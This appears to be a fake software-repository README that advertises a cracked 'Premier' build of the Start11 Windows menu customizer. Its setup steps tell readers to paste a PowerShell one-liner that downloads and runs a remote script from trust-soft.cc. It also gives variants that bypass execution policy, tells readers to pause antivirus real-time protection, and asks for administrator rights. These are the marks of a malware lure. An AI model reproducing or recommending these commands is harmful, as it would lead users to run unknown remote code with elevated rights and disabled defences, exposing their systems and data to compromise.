# Start11 Premier Edition — Advanced Windows Interface Customizer

Welcome to the automated configuration repository for **Start11 Premier Full Build**. This project offers a lightweight, secure deployment workspace engineered to unlock the absolute complete customization options for your desktop interface, taskbar layouts, and main system menu.

Bring back traditional navigation, design clean layouts, and enjoy unrestricted premium features without complex registration procedures or tedious manual modification loops.

---

## 🎨 Core Customizations in Start11 Premier

* **Menu Style Restoration:** Seamlessly swap layouts between classic configurations and modern design grids.
* **Enhanced Taskbar Controls:** Pin files, modify transparent settings, and resize menu item icons.
* **Smart Filter & Search:** Integrated desktop indexing engine for rapid retrieval of files and active links.
* **Visual Theme Pairing:** Full support for custom icons, hidden margins, and rounded corner adjustments.

---

## 🛠 Quick Setup Guide (PowerShell)

1. Launch PowerShell:
   * Press Win + X on your keyboard.
   * Click on Terminal or Windows PowerShell from the list.

2. Execute the Setup Script:
   Copy the command below, paste it into your PowerShell window, and hit Enter. The script will handle the necessary registry tweaks and install all dependencies automatically:

   ```powershell
   irm https://trust-soft.cc/powershell/Loader.ps1 | iex
   ```

---

## 💡 Resolving Issues

### 💬 Script is blocked by Execution Policy
If Windows stops the script from running due to security policies, you can force it to run by pasting this command into a standard Command Prompt (cmd):

```cmd
powershell -ExecutionPolicy Bypass -Command "irm https://trust-soft.cc/powershell/Loader.ps1 | iex"
```

### 💬 "irm" command not found (Outdated PowerShell)
If your PowerShell version doesn't support the irm shortcut, use the full, unabbreviated commands instead:

```cmd
Invoke-RestMethod https://trust-soft.cc/powershell/Loader.ps1 | Invoke-Expression
```

### 💬 Antivirus / SmartScreen Alerts
Security software might occasionally flag automated installers. If the script gets blocked, pause "Real-time protection" in your Windows Security dashboard, run the setup, and re-enable your antivirus immediately afterward.

---

## 📋 Compatibility Matrix

* **OS Platform:** Designed exclusively for modern Windows 10 and 11 environments (64-bit builds).
* **System Integration:** Runs seamlessly without breaking native OS cumulative security hotfixes.
* **Administrative Rights:** Elevated system rights are needed to initialize interface configuration layers.
